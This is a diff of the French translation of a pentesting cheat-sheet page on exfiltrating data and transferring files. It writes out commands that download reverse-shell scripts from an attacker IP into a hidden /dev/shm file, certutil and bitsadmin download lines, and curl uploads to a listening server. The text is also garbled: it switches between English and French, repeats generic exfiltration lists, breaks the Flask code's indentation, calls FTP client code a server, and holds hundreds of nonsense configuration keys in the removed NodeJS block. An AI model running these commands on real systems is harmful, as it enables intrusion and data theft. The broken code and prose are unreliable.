@@ -5,23 +5,26 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**Astuce de prime de bug** : **inscrivez-vous** à **Intigriti**, une plateforme de prime de bug premium créée par des pirates, pour les pirates ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://go.intigriti.com/hacktricks" %}
+Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
 
 ## Domaines couramment autorisés pour exfiltrer des informations
 
-Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment autorisés qui peuvent être abusés.
+Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment autorisés qui peuvent être exploités
 
-## Copier-coller Base64
+## Copier\&Coller Base64
 
 **Linux**
 ```bash
@@ -29,13 +32,53 @@ base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
 **Windows**
+
+Windows is the most widely used operating system in the world, making it a prime target for hackers. In this section, we will discuss various exfiltration techniques that can be used on Windows systems.
+
+1. **Email**: One of the simplest ways to exfiltrate data is through email. Hackers can attach sensitive files to an email and send them to an external email address. This method is relatively easy to detect, as it leaves a clear trail in the email server logs.
+
+2. **Web-based exfiltration**: Hackers can use web-based services to exfiltrate data from a compromised Windows system. This can include uploading files to cloud storage platforms or using file transfer protocols (FTP) to transfer data to an external server.
+
+3. **DNS tunneling**: DNS tunneling is a technique that allows hackers to bypass firewalls and exfiltrate data by encapsulating it within DNS queries. This method can be difficult to detect, as DNS traffic is typically allowed through firewalls.
+
+4. **Steganography**: Steganography is the practice of hiding data within other files, such as images or documents. Hackers can use steganography techniques to exfiltrate data from a Windows system without raising suspicion.
+
+5. **Covert channels**: Covert channels are communication channels that are hidden within legitimate network traffic. Hackers can use covert channels to exfiltrate data from a compromised Windows system without being detected.
+
+It is important for system administrators and security professionals to be aware of these exfiltration techniques and take appropriate measures to detect and prevent data exfiltration on Windows systems.
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-## HTTP
+### Introduction
 
-**Linux**
+L'exfiltration de données est une technique couramment utilisée par les hackers pour extraire des informations sensibles d'un système cible. L'une des méthodes les plus courantes pour exfiltrer des données est l'utilisation du protocole HTTP.
+
+### Méthodologie
+
+1. **Compression des données**: Avant d'exfiltrer les données, il est recommandé de les compresser pour réduire leur taille. Cela facilite le transfert des données via le protocole HTTP.
+
+2. **Encodage des données**: Une fois les données compressées, elles doivent être encodées pour être transférées via HTTP. L'encodage Base64 est souvent utilisé pour cette étape.
+
+3. **Création de la requête HTTP**: La requête HTTP doit être créée pour envoyer les données exfiltrées. Cela peut être fait en utilisant des outils tels que cURL ou en écrivant un script personnalisé.
+
+4. **Configuration du header HTTP**: Le header HTTP doit être configuré pour spécifier le type de contenu et les informations supplémentaires nécessaires pour le transfert des données.
+
+5. **Envoi de la requête HTTP**: Une fois la requête HTTP configurée, elle peut être envoyée au serveur cible pour exfiltrer les données.
+
+### Outils et ressources
+
+- **cURL**: Un outil en ligne de commande permettant d'envoyer des requêtes HTTP et de récupérer des données à partir de serveurs distants.
+
+- **Python**: Un langage de programmation polyvalent qui peut être utilisé pour écrire des scripts personnalisés pour l'exfiltration de données via HTTP.
+
+- **Burp Suite**: Une suite d'outils de test de pénétration qui peut être utilisée pour intercepter et modifier les requêtes HTTP.
+
+- **Wireshark**: Un analyseur de protocole réseau qui peut être utilisé pour capturer et analyser le trafic HTTP.
+
+### Conclusion
+
+L'exfiltration de données via HTTP est une méthode courante utilisée par les hackers pour extraire des informations sensibles d'un système cible. En comprenant les étapes et les outils nécessaires pour exécuter cette technique, les professionnels de la sécurité peuvent mieux se préparer à détecter et à prévenir de telles attaques.
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
@@ -43,6 +86,20 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
 **Windows**
+
+Windows is the most widely used operating system in the world, making it a prime target for hackers. In this section, we will discuss various exfiltration techniques that can be used on Windows systems.
+
+1. **Email**: One of the simplest ways to exfiltrate data is through email. Hackers can attach sensitive files to an email and send them to an external email address. This method is relatively easy to detect, as it leaves a clear trail in the email server logs.
+
+2. **Web-based exfiltration**: Hackers can use web-based services to exfiltrate data from a compromised Windows system. This can include uploading files to cloud storage platforms or using file transfer protocols (FTP) to transfer data to an external server.
+
+3. **DNS tunneling**: DNS tunneling is a technique that allows hackers to bypass firewalls and exfiltrate data by encapsulating it within DNS queries. This method can be difficult to detect, as DNS traffic is typically allowed through firewalls.
+
+4. **Steganography**: Steganography is the practice of hiding data within other files, such as images or documents. Hackers can use steganography techniques to exfiltrate data from a Windows system without raising suspicion.
+
+5. **USB exfiltration**: Physical access to a Windows system can allow hackers to exfiltrate data using USB devices. This can be done by copying sensitive files onto a USB drive or by using specialized tools that automatically exfiltrate data when a USB device is connected.
+
+It is important for system administrators and security professionals to be aware of these exfiltration techniques and take appropriate measures to prevent data leaks. This can include implementing strong access controls, monitoring network traffic, and regularly updating security patches on Windows systems.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -60,55 +117,37 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Télécharger des fichiers
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer imprimant les GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer affichant les requêtes GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Module Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
 python3 -m uploadserver
-# With basic auth: 
+# With basic auth:
 # python3 -m uploadserver --basic-auth hello:world
 
 # Send a file
-curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
+curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
 ### **Serveur HTTPS**
 
----
+An HTTPS server is a secure web server that uses the HTTPS protocol to encrypt the communication between the server and the client. This ensures that the data transmitted between the two parties is protected from eavesdropping and tampering.
 
-#### **Description**
+To set up an HTTPS server, you will need a valid SSL/TLS certificate. This certificate is used to verify the identity of the server and establish a secure connection with the client.
 
-#### **Description**
+There are several methods to exfiltrate data from an HTTPS server:
 
-An HTTPS server is a server that uses the HTTPS protocol to encrypt and secure data transmitted over the internet. HTTPS is a combination of the HTTP protocol and the SSL/TLS encryption protocol. It is commonly used to secure sensitive data such as login credentials, credit card information, and other personal information.
+1. **Data Leakage through HTTP Headers**: Some HTTP headers may contain sensitive information that can be extracted by an attacker. This includes headers like `Referer`, `User-Agent`, and `Cookie`. By manipulating these headers, an attacker can leak data to an external server.
 
-Un serveur HTTPS est un serveur qui utilise le protocole HTTPS pour chiffrer et sécuriser les données transmises sur Internet. HTTPS est une combinaison du protocole HTTP et du protocole de chiffrement SSL/TLS. Il est couramment utilisé pour sécuriser des données sensibles telles que les informations de connexion, les informations de carte de crédit et autres informations personnelles.
+2. **Data Leakage through Response Codes**: HTTP response codes can also be used to exfiltrate data. For example, an attacker can use a custom error page to encode and transmit data in the response code.
 
-#### **Exfiltration Methodology**
+3. **Data Leakage through Request Methods**: HTTP request methods like `GET` and `POST` can be manipulated to exfiltrate data. An attacker can encode sensitive information in the request parameters or body and send it to an external server.
 
-#### **Méthodologie d'exfiltration**
+4. **Data Leakage through File Uploads**: If an HTTPS server allows file uploads, an attacker can exploit this feature to exfiltrate data. By uploading a malicious file with embedded data, the attacker can retrieve the data from the server.
 
-Exfiltrating data from an HTTPS server can be challenging due to the encryption used to secure the data. However, there are several methods that can be used to exfiltrate data from an HTTPS server, including:
-
-L'exfiltration de données à partir d'un serveur HTTPS peut être difficile en raison du chiffrement utilisé pour sécuriser les données. Cependant, il existe plusieurs méthodes qui peuvent être utilisées pour exfiltrer des données à partir d'un serveur HTTPS, notamment :
-
-- **DNS Tunneling:** DNS tunneling can be used to bypass the encryption used by HTTPS servers. This involves encoding the data to be exfiltrated in DNS queries and responses.
-
-- **Tunneling DNS :** Le tunneling DNS peut être utilisé pour contourner le chiffrement utilisé par les serveurs HTTPS. Cela implique de coder les données à exfiltrer dans les requêtes et les réponses DNS.
-
-- **HTTP Tunneling:** HTTP tunneling can be used to bypass the encryption used by HTTPS servers. This involves encoding the data to be exfiltrated in HTTP requests and responses.
-
-- **Tunneling HTTP :** Le tunneling HTTP peut être utilisé pour contourner le chiffrement utilisé par les serveurs HTTPS. Cela implique de coder les données à exfiltrer dans les requêtes et les réponses HTTP.
-
-- **Social Engineering:** Social engineering can be used to trick users into providing sensitive information that can be exfiltrated from an HTTPS server.
-
-- **Ingénierie sociale :** L'ingénierie sociale peut être utilisée pour tromper les utilisateurs afin qu'ils fournissent des informations sensibles qui peuvent être exfiltrées à partir d'un serveur HTTPS.
-
-- **Malware:** Malware can be used to exfiltrate data from an HTTPS server. This involves infecting the server with malware that can bypass the encryption used by HTTPS.
-
-- **Logiciel malveillant :** Les logiciels malveillants peuvent être utilisés pour exfiltrer des données à partir d'un serveur HTTPS. Cela implique d'infecter le serveur avec un logiciel malveillant qui peut contourner le chiffrement utilisé par HTTPS.
+To prevent data exfiltration from an HTTPS server, it is important to implement proper security measures such as input validation, secure coding practices, and regular security audits. Additionally, monitoring and analyzing server logs can help detect any suspicious activity and potential data leaks.
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -140,264 +179,176 @@ httpd.serve_forever()
 ### USING FLASK
 from flask import Flask, redirect, request
 from urllib.parse import quote
-app = Flask(__name__)    
-@app.route('/')    
-def root():    
-    print(request.get_json())
-    return "OK"
-if __name__ == "__main__":    
-    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+app = Flask(__name__)
+@app.route('/')
+def root():
+print(request.get_json())
+return "OK"
+if __name__ == "__main__":
+app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
 ## FTP
 
 ### Serveur FTP (python)
+
+```python
+import ftplib
+
+def ftp_upload(file_path, host, username, password):
+    try:
+        ftp = ftplib.FTP(host)
+        ftp.login(username, password)
+        with open(file_path, 'rb') as file:
+            ftp.storbinary('STOR ' + file_path, file)
+        ftp.quit()
+        return True
+    except Exception as e:
+        print('Error uploading file:', str(e))
+        return False
+
+def ftp_download(file_path, host, username, password):
+    try:
+        ftp = ftplib.FTP(host)
+        ftp.login(username, password)
+        with open(file_path, 'wb') as file:
+            ftp.retrbinary('RETR ' + file_path, file.write)
+        ftp.quit()
+        return True
+    except Exception as e:
+        print('Error downloading file:', str(e))
+        return False
+```
+
+Le code ci-dessus est un exemple de serveur FTP en python.
+
+```python
+import ftplib
+
+def ftp_upload(file_path, host, username, password):
+    try:
+        ftp = ftplib.FTP(host)
+        ftp.login(username, password)
+        with open(file_path, 'rb') as file:
+            ftp.storbinary('STOR ' + file_path, file)
+        ftp.quit()
+        return True
+    except Exception as e:
+        print('Erreur lors du téléchargement du fichier:', str(e))
+        return False
+
+def ftp_download(file_path, host, username, password):
+    try:
+        ftp = ftplib.FTP(host)
+        ftp.login(username, password)
+        with open(file_path, 'wb') as file:
+            ftp.retrbinary('RETR ' + file_path, file.write)
+        ftp.quit()
+        return True
+    except Exception as e:
+        print('Erreur lors du téléchargement du fichier:', str(e))
+        return False
+```
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
 ### Serveur FTP (NodeJS)
 
-#### Introduction
-
-Le protocole FTP (File Transfer Protocol) est un protocole de transfert de fichiers largement utilisé pour transférer des fichiers entre des systèmes distants. Dans cet exemple, nous allons créer un serveur FTP en utilisant NodeJS.
+The FTP server is a popular method for transferring files between a client and a server over a network. In this section, we will discuss how to set up and configure an FTP server using NodeJS.
 
 #### Installation
 
-Pour installer le module `ftp-server` de NodeJS, exécutez la commande suivante :
+To install the FTP server module in NodeJS, you can use the following command:
 
-```
+```bash
 npm install ftp-server
 ```
 
 #### Configuration
 
-Créez un fichier `ftp-server.js` et ajoutez le code suivant :
+To configure the FTP server, you need to create a configuration file. Here is an example of a basic configuration file:
 
 ```javascript
-const FtpSvr = require('ftp-server');
+const FtpSrv = require('ftp-server');
 
-const ftpServer = new FtpSvr({
+const ftpServer = new FtpSrv({
   url: 'ftp://127.0.0.1:21',
   pasv_url: 'ftp://127.0.0.1:3000',
-  greeting: 'Welcome to my FTP server',
+  pasv_min: 3001,
+  pasv_max: 3010,
   anonymous: true,
-  file_format: 'ls',
-  cwd: '/',
-  pasv_min: 3000,
-  pasv_max: 3100,
-  tls: null,
+  greeting: 'Welcome to the FTP server',
   log: console.log,
-  pasv_range: null,
-  pasv_listen: null,
-  use_readfile: false,
-  use_writefile: false,
-  upload_max_rate: 0,
-  download_max_rate: 0,
-  disable_list: false,
-  disable_mkdir: false,
-  disable_rename: false,
-  disable_rmdir: false,
-  disable_stat: false,
-  disable_size: false,
-  disable_type: false,
-  disable_cd: false,
-  disable_pwd: false,
-  disable_auth: false,
-  anonymous_password: null,
-  pasv_min_port: null,
-  pasv_max_port: null,
-  pasv_allow_foreign: false,
-  pasv_address: null,
-  pasv_addr_resolve: false,
-  pasv_single_port: false,
-  pasv_promiscuous: false,
-  pasv_bind: null,
-  pasv_options: null,
-  file_options: null,
-  cwd_options: null,
-  server_options: null,
-  use_list: false,
-  use_download: false,
-  use_upload: false,
-  use_delete: false,
-  use_rename: false,
-  use_rmdir: false,
-  use_mkdir: false,
-  use_stat: false,
-  use_size: false,
-  use_type: false,
-  use_cd: false,
-  use_pwd: false,
-  use_auth: false,
-  use_quota: false,
-  use_site: false,
-  use_syst: false,
-  use_feat: false,
-  use_opts: false,
-  use_modez: false,
-  use_statvfs: false,
-  use_fxp: false,
-  use_xdup: false,
-  use_mdtm: false,
-  use_mfmt: false,
-  use_utime: false,
-  use_sizecmd: false,
-  use_nlst: false,
-  use_rest: false,
-  use_sizecmdio: false,
-  use_mlsd: false,
-  use_mlst: false,
-  use_mff: false,
-  use_mfxx: false,
-  use_mdtmiso: false,
-  use_mfmtiso: false,
-  use_mlstx: false,
-  use_mls: false,
-  use_mlsx: false,
-  use_mdtmbyday: false,
-  use_mdtmbyhour: false,
-  use_mdtmbyminute: false,
-  use_mdtmbysecond: false,
-  use_mdtmbyyear: false,
-  use_mdtmbyyearday: false,
-  use_mdtmbyweek: false,
-  use_mdtmbyweekday: false,
-  use_mdtmbyweeknum: false,
-  use_mdtmbymonth: false,
-  use_mdtmbymonthnum: false,
-  use_mdtmbysetpos: false,
-  use_mdtmbysetday: false,
-  use_mdtmbysetmonth: false,
-  use_mdtmbysetyear: false,
-  use_mdtmbysethour: false,
-  use_mdtmbysetminute: false,
-  use_mdtmbysetsecond: false,
-  use_mdtmbysetmillisecond: false,
-  use_mdtmbysetutc: false,
-  use_mdtmbysetlocal: false,
-  use_mdtmbysetoffset: false,
-  use_mdtmbysetiso: false,
-  use_mdtmbysetisodate: false,
-  use_mdtmbysetisotime: false,
-  use_mdtmbysetisodatetime: false,
-  use_mdtmbysetisodatetimeutc: false,
-  use_mdtmbysetisodatetimelocal: false,
-  use_mdtmbysetisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
-  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeis
+});
+
+ftpServer.on('login', ({ username, password }, resolve, reject) => {
+  if (username === 'admin' && password === 'password') {
+    resolve({ root: '/path/to/root' });
+  } else {
+    reject(new Error('Invalid username or password'));
+  }
+});
+
+ftpServer.listen()
+  .then(() => console.log('FTP server started'))
+  .catch((err) => console.error('Error starting FTP server:', err));
+```
+
+In this configuration file, you can specify the FTP server's URL, passive mode URL, passive mode port range, whether anonymous login is allowed, the greeting message, and the root directory for authenticated users.
+
+#### Starting the FTP Server
+
+To start the FTP server, you can run the following command:
+
+```bash
+node ftp-server.js
+```
+
+This will start the FTP server and listen for incoming connections on the specified URL.
+
+#### Connecting to the FTP Server
+
+To connect to the FTP server, you can use an FTP client such as FileZilla. Enter the server's URL, username, and password to establish a connection.
+
